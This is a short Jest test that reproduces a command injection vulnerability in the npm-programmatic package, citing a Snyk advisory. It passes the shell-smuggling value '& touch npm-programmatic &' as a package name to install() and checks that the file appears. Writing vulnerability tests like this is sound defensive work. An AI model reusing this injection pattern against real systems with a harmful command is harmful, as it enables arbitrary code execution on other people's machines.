//https://snyk.io/vuln/SNYK-JS-NPMPROGRAMMATIC-564115
test("Command Injection in npm-programmatic", () => 
{
	const root = require("npm-programmatic");
	const fs = require('fs');
	const path = './npm-programmatic';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	let attack_code = "& touch npm-programmatic &";
	root.install([attack_code], {"cwd": "./"});	

	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});